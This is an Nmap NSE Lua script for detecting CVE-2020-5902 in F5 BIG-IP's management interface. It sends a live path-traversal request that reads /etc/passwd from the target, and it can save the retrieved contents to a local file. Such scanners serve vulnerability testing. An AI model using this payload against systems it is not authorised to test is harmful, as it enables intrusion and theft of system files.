local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local table = require "table"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"
local io = require "io"

description = [[
This NSE script checks whether the target server is vulnerable to CVE-2020-5902
]]
---
-- @usage
-- nmap --script http-vuln-cve2020-5902 -p <port> <host>
-- nmap --script http-vuln-cve2020-5902 -p <port> <host> --script-args output='file.txt'
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  http
-- | CVE-2020-5902: 
-- |   Host is vulnerable to CVE-2020-5902
-- @changelog
-- 01-07-2020 - Discovery: Mikhail Klyuchnikov (@__Mn1__) 
-- 05-07-2020 - Author: Dhiraj Mishra (@RandomDhiraj) --[[ NMAP Script--]]
-- 05-07-2020 - Exploit Reference: Budi Khoirudin (@x4ce) --[[https://twitter.com/x4ce/status/1279790599793545216--]]
-- @xmloutput
-- <table key="NMAP-1">
-- <elem key="title">BIG-IP TMUI RCE Vulnerability</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages. 
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2020</elem>
-- <elem key="day">01</elem>
-- <elem key="month">07</elem>
-- </table>
-- </table>
-- <elem key="disclosure">01-07-2020</elem>
-- <table key="extra_info">
-- </table>
-- <table key="refs">
-- <elem>https://support.f5.com/csp/article/K52145254</elem>
-- <elem>https://nvd.nist.gov/vuln/detail/CVE-2020-5902</elem>
-- </table>
-- </table>

author = "Dhiraj Mishra (@RandomDhiraj)" --[[ NMAP Script--]]
Discovery = "Mikhail Klyuchnikov (@__Mn1__)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive","vuln"}

portrule = shortport.ssl

action = function(host,port)
  local outputFile = stdnse.get_script_args(SCRIPT_NAME..".output") or nil
  local vuln = {
    title = 'BIG-IP TMUI RCE Vulnerability',
    state = vulns.STATE.NOT_VULN,
    description = [[
	In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.
    ]],
    references = {
      'https://support.f5.com/csp/article/K52145254',
      'https://nvd.nist.gov/vuln/detail/CVE-2020-5902',
    },
    dates = {
      disclosure = {year = '2020', month = '07', day = '01'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local path = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
  local response
  local output = {}
  local success = "Host is vulnerable to CVE-2020-5902"
  local fail = "Host is not vulnerable"
  local match = 'root:x:0:0:root'
  local credentials
  local TMUI
	
  response = http.get(host, port.number, path)  

  if not response.status then
    stdnse.print_debug("Request Failed")
    return
  end
  if response.status == 200 then
    if string.match(response.body, match) then
      stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME,host.targetname or host.ip, path)
      vuln.state = vulns.STATE.VULN
      TMUI = (("Verify arbitrary file read: https://%s:%d%s"):format(host.targetname or host.ip,port.number, path))
		
      if outputFile then
        credentials = response.body:gsub('%W','.')
	vuln.check_results = stdnse.format_output(true, TMUI)
        vuln.extra_info = stdnse.format_output(true, "Credentials are being stored in the output file")
	file = io.open(outputFile, "a")
	file:write(credentials, "\n")
      else
        vuln.check_results = stdnse.format_output(true, TMUI)
      end
    end
  elseif response.status == 403 then
    stdnse.print_debug("%s: %s GET %s - %d", SCRIPT_NAME, host.targetname or host.ip, path, response.status)
    vuln.state = vulns.STATE.NOT_VULN
  end

  return vuln_report:make_output(vuln)
end
